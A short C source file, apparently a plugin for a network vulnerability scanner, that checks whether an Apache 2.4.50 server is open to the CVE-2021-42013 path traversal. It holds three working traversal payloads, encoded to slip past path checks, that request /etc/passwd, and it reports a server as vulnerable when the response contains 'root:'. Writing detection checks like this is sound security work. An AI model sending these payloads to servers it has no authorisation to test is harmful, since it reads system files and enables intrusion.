/* http-vuln-cve2021-42013 - Apache 2.4.50 path traversal probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char *paths[] = { "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", "/cgi-bin/.%%32%65/.%%32%65/etc/passwd", "/icons/%%32%65%%32%65/etc/passwd" };
    char resp[8192];
    int found = 0;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int n = ar_http_get(ctx, paths[i], resp, sizeof(resp));
        if (n > 0 && ar_contains_ci(ar_http_body(resp), "root:")) {
            ar_append(ctx, "%s%s", (found == 0) ? "VULNERABLE: " : ", ",
                      paths[i]);
            found++;
        }
    }
    if (found == 0) {
        ar_out(ctx, "not vulnerable: CVE-2021-42013 Apache path traversal");
    } else {
        ar_append(ctx, " (CVE-2021-42013 Apache path traversal)");
    }
    return 0;
}
